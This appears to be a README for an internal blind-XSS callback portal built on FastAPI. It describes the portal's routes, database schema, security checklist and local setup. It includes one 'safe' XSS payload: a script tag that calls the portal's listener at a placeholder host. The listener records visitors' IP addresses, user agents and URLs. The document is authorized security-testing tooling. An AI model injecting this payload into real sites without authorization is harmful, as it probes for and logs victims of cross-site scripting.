# Internal Blind XSS Monitoring Portal

Defensive-only web portal for authorized internal Blind XSS testing.

## Architecture Overview
- **Backend:** FastAPI + SQLAlchemy + SQLite
- **Frontend:** Server-rendered Jinja2 templates + plain CSS
- **Auth:** Session-based login with roles (`admin`, `tester`)
- **Core Listener:** `GET /xss/{project_id}` logs callback metadata safely
- **Security Controls:** CSRF token validation, rate limiting, input sanitization, password hashing, no dangerous features

## Folder Structure

```
.
├── app/
│   ├── main.py
│   ├── database.py
│   ├── models.py
│   ├── static/
│   │   └── styles.css
│   └── templates/
│       ├── base.html
│       ├── login.html
│       ├── register.html
│       ├── projects.html
│       ├── project_new.html
│       ├── project_detail.html
│       ├── hits.html
│       ├── hit_detail.html
│       └── report.html
├── requirements.txt
├── .env.example
└── README.md
```

## Database Schema
- **users**: `id`, `username`, `password_hash`, `role`, `created_at`
- **projects**: `id`, `name`, `target_url`, `notes`, `created_at`, `owner_id -> users.id`
- **hits**: `id`, `timestamp`, `ip_address`, `user_agent`, `referer`, `full_url`, `custom_tag`, `project_id -> projects.id`

## API / Routes
- `GET /login`, `POST /login`, `POST /logout`
- `GET /users/register`, `POST /users/register` (admin only)
- `GET /projects`, `GET /projects/new`, `POST /projects`, `GET /projects/{project_id}`
- `GET /xss/{project_id}?tag=...` (listener endpoint)
- `GET /hits`, `GET /hits/{hit_id}`, `GET /hits/export.csv`
- `GET /reports/{project_id}`

## Safe Payload Example
```html
<script>fetch("https://your-portal.example/xss/1?tag=safe-test",{method:"GET",mode:"no-cors"});</script>
```

## Security Checklist
- [x] Password hashing (bcrypt)
- [x] Session-based auth with role checks
- [x] CSRF protection for state-changing form actions
- [x] Input validation + sanitization for fields/headers/query params
- [x] Output encoding by Jinja2 autoescaping
- [x] Listener rate limiting per client+project
- [x] No file upload, no command execution, no open redirects
- [x] HTTPS-ready session cookie setting via env (`SESSION_HTTPS_ONLY=1`)

## Local Setup

1. Create virtual environment and install dependencies:
   ```bash
   python3 -m venv .venv
   source .venv/bin/activate
   pip install -r requirements.txt
   ```
2. Create env file:
   ```bash
   cp .env.example .env
   ```
3. Run the app:
   ```bash
   uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
   ```
4. Open `http://127.0.0.1:8000`
5. Default bootstrap admin is from env (`ADMIN_USERNAME` / `ADMIN_PASSWORD`). Change in production.

## Defensive Use Notice
This portal is intentionally limited to safe callback logging for authorized security testing and monitoring workflows.
